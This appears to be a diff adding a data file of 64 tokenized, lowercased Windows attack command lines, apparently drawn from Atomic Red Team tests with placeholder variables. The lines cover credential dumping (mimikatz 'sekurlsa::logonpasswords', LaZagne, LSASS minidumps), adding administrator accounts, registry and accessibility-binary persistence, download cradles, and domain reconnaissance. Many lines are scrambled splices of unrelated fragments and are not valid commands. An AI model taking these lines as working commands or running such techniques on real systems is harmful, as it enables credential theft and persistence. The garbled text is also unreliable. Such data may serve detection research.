@@ -1,0 +1,64 @@
+net user $ { user_name } ;
+remove-item -path $ { lsass_pid } = `` $ { filename_regex }
+rdrleakdiag.exe /list
+git clone $ { compression_level } -o { # { service_name }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' -arguments -l '' -class activescripteventconsumer -arguments $ consumerargs
+net user $ { username } /domain : /domain
+takeown /f c : \users\ bookmarks
+lazagne.exe windows
+assoc $ { directory_path }
+get-eventlog -list id select-object -expandproperty username
+net group `` domain admins '' -accepteula `` `` cor_profiler '' $ { clsid } : '
+defaultaccount = : /users
+lazagne.exe windows
+nmap -i $ { domain }
+out-minidump.exe
+copy $ env : )
+net user $ { task_name } $ { username } password= $ { password }
+bitsadmin.exe /create $ { domain
+silentrunner.exe : $ { { setup\installed ip_address } -u -u $ { local_file_path }
+net stop
+net uesr
+get-service -value both
+auditpol -classname win32_processor | select-object -excludeproperty add `` cim * : /grant [ net.securityprotocoltype ] : :frombase64string ( [ net.securityprotocoltype ] : :tls12
+at.exe $ { time } . % \ $ { url } / $ { command }
+net user administrator /add
+net user $ { output_file } -l $ i -l $ { range_step } , i $ { binary } in and -u $ { ticket_output } \appdata\local\temp\lsass.dmp .starttype system32_binary } , ( ' '' fullname , fullname , keylog
+reg.exe add `` hkey_current_user\control panel\desktop '' /v `` '' '' autorun '' \windows\system32\sethc.exe
+wt.exe : '' $ { command } '' /launchargs : / $ { krbtgt_ntlm } . % ads_zip } \appdata\local\temp\lsass.dmp /a
+vsiisexelauncher.exe -p $ { temp % temp % temp % \ $ { \ $ { domain } \ $ { \ $ { \secrets name ( ' } , $ ( ( path )
+python -c `` hklm\software\microsoft\windows nt\currentversion\image file '' new-object net.webclient ) .downloadstring ( ) minidump ( ' `` exit -- ' set objws = ( createobject ( `` installscreensaver $ ( psexec.exe \\ $ { copy : service account user_name
+rdrleakdiag.exe /p $ target service account username }
+put $ env : { domain }
+adfind.exe -f ( objectcategory=computer )
+net localgroup administrators '' /domain
+net user administrator /domain
+`` http : :credman
+bitsadmin.exe -name -filepath $ { /o } /fullmemdmp , -s $ { \secrets -exec=
+net user administrator /domain
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /v /f
+bitsadmin.exe /create $ { file_name }
+net `` -filepath $ { domain }
+del $ { base64_commmand } ; -u $ true
+attrib +h $ : yes admins
+`` put $ { vbs_script }
+-executionpolicy get-process /all text.encoding ] : :createprocessfromparent ( servicepackmajorversion , [ net.securityprotocoltype ] : :frombase64string ( [ lsass ) .downloadstring ( get-psreadlineoption ) -- net.securityprotocoltype ] : /all ' -usebasicparsing ) ; get-domainuser ' , : ' ' $ ( $ { ip_prefix } account krbtgt_ntlm
+net user $ domain /domain
+$ env : \software\microsoft\command \system32\osk.exe
+lazagne.exe windows -lsa
+net user administrator /domain
+set windir= $ { shadow appdata % \updater.exe
+attrib +h $ { file_name }
+get-localgroupmember -group users
+reg add `` hklm\software\microsoft\active setup\installed components\atomic_test '' -name `` clearing '' \programdata\microsoft\windows\start \amsi.dll
+del % windir % \system32\osk.exe /grant administrators : f
+get-clipboard
+sekurlsa : :logonpasswords
+add-localgroupmember query `` $ { file_name }
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters '' `` cor_profiler -name `` hklm\software\microsoft\windows '' packages '' '' , $ { system32_binary } '' , '' , atomictest.dll }
+sc.exe create '' $ { username } -l $ { path } , 0 0 % temp % temp % \ $ true , ( { scr_path }
+get-wmiobject win32_computersystem | 'image pnpclass /set ] : :createprocessfromparent ( [ convert ] : :frombase64string ( [ net.securityprotocoltype ] : :securityprotocol = [ net.securityprotocoltype ] : :tls12
+get-localuser
+sekurlsa : :minidump $ ( username ) ;
+net localgroup administrators c : \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' '' psexec.exe ; objws = $ shell.createshortcut ( $ shortcutlocation ) ;
+namp -sn $ { domain }
